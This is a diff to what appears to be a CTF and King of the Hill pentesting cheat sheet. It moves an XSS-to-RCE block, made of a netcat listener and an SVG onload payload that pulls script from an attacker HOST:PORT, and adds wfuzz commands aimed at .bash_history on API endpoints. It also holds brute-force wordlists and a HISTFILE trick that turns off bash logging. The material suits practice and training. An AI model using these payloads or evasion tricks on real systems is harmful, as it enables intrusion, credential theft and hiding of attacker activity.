@@ -174,6 +174,34 @@ using wpscan we can find users or do some further enumeration of wordpress versi
 To bruteforce passwords
 * `wpscan --url <ip> -U user_file_path -P password_file_path`
 
+# Web
+### XSS to RCE
+```
+Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
+Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
+```
+
+### API (Applicaton Programmable Interface)
+
+* Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
+* Use wfuzz which is tool to fuzz for API end points or for parameter
+`wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404` <br/>
+Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example
+
+# Wordlists
+
+### Directory Bruteforcing
+* /usr/share/wordlists/dirb/big.txt
+* /usr/share/wordlists/dirb/common.txt
+* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+### Credential Bruteforcing
+
+* /usr/share/wordlists/rockyou.txt
+* /usr/share/wordlists/fasstrackt.txt
+* using `crackstation`
+* using `seclists`
+
 # King Of The Hill (KoTH)
 ### Monitoring and Closing Shell (Linux)
 * strace `debugging / tamper with processes`
@@ -202,25 +230,9 @@ To bruteforce passwords
 * quser
 * logoff id|user_name  
 
-# Web
-### XSS to RCE
-```
-Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
-Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
-```
-# Wordlists
 
-### Directory Bruteforcing
-* /usr/share/wordlists/dirb/big.txt
-* /usr/share/wordlists/dirb/common.txt
-* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
-### Credential Bruteforcing
 
-* /usr/share/wordlists/rockyou.txt
-* /usr/share/wordlists/fasstrackt.txt
-* using `crackstation`
-* using `seclists`
 
 export HISTFILE=/dev/null found this it might help you out a little when doing KOTH it basically stops bash logging your commands in the ~/.bash_history file <br/>
 sudo ifconfig tun0 down<br/>
